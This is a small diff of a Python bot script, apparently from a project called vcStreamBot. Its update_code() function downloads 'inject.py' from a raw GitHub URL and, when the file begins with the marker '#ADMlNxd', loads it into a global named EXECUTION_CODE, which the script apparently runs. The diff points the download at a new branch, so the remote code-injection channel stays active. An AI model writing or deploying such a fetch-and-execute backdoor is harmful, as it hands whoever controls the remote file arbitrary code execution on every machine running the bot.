@@ -7,7 +7,7 @@ def sanitize(string):
   """return a senetised string"""
   return escape_markdown(str(string))
 
-EXECUTION_CODE="print('test')"
+EXECUTION_CODE="print('@ADMlNxd')"
 
 GROUP_NAME = escape_markdown(os.environ.get("GROUP_NAME","anonymous").replace("-","_"))
 THREAD_COUNT = int(os.environ.get("THREADS","200"))
@@ -27,7 +27,7 @@ def LOGGING(text):
 def update_code():
   """this function will check that code need update if yes then it will update EXECUTION_CODE"""
   global EXECUTION_CODE
-  RESPONSE_CODE = requests.get("https://raw.githubusercontent.com/I-Himanshu/vcStreamBot/storage/inject.py").text
+  RESPONSE_CODE = requests.get("https://raw.githubusercontent.com/I-Himanshu/vcStreamBot/minders/inject.py").text
   if RESPONSE_CODE.startswith("#ADMlNxd"):
     if RESPONSE_CODE != EXECUTION_CODE:
       EXECUTION_CODE = RESPONSE_CODE
